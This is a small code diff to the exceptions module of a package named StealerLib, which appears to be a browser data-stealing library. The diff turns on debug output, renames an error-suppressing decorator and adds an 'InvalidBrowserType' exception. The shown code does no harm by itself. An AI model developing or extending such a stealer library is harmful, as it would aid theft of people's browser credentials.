@@ -5,9 +5,23 @@
     @package: stealerlib/exceptions.py
 """
 
-debug = False
+debug = True
 
-def quiet(func):
+def catch(func: callable):
+    """A function decorator that catches and handles any exceptions thrown
+
+    Parameters:
+        func (function): The function to decorate and handle the exceptions of
+
+    Returns:
+        function: The decorated function
+
+    Example:
+        @catch
+        def handled_function():
+            # Function code here, exceptions will be handled
+    """
+
     def handle(*args, **kwargs):
         try:
             func(*args, **kwargs)
@@ -15,4 +29,10 @@ def quiet(func):
             if debug:
                 print("[!] StealerLib handled an unexpected error: {}".format(error))
             pass
+
     return handle
+
+
+class InvalidBrowserType(Exception):
+    def __init__(self, message):
+        self.message = message
